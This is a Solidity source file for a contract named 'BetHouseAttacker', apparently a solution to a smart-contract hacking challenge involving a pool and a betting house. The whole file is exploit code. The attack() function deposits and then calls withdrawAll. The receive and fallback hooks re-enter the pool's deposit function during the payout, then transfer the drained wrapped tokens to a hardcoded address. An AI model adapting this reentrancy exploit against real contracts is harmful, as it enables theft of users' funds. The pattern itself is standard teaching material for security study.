// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IPool {
    function deposit(uint256 value_) external payable;
    function lockDeposits() external;
    function withdrawAll() external;
    function balanceOf(address account_) external view returns (uint256);
}

interface IPoolToken {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IBetHouse {
    function makeBet(address bettor_) external;
    function isBettor(address bettor_) external view returns (bool);
}

contract BetHouseAttacker {
    IPool public immutable pool;
    IPoolToken public immutable depositToken;
    IBetHouse public immutable betHouse;

    address public immutable wrappedToken;

    bool private attacking;
    uint256 private reentrancyCount;
    address public myAddr = 0x91DcF137f42130E5095558Ee1D143F0282B114B0;
    
    constructor(address pool_, address depositToken_, address betHouse_, address wrappedToken_) {
        pool = IPool(pool_);
        depositToken = IPoolToken(depositToken_);
        betHouse = IBetHouse(betHouse_);
        wrappedToken = wrappedToken_;
    }
    
    receive() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit(5);

        uint256 balance = IPoolToken(wrappedToken).balanceOf(address(this));
        if (balance >= 20) {
            IPoolToken(wrappedToken).transfer(myAddr, 20);
        }
    }
    
    fallback() external payable {
        
        depositToken.approve(address(pool), 5);
        pool.deposit(5);
        
        uint256 balance = IPoolToken(wrappedToken).balanceOf(address(this));
        if (balance >= 20) {
            IPoolToken(wrappedToken).transfer(myAddr, 20);
        }
    }

    function attack() external payable {

        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);
        
        pool.withdrawAll();
        
    }
    
}
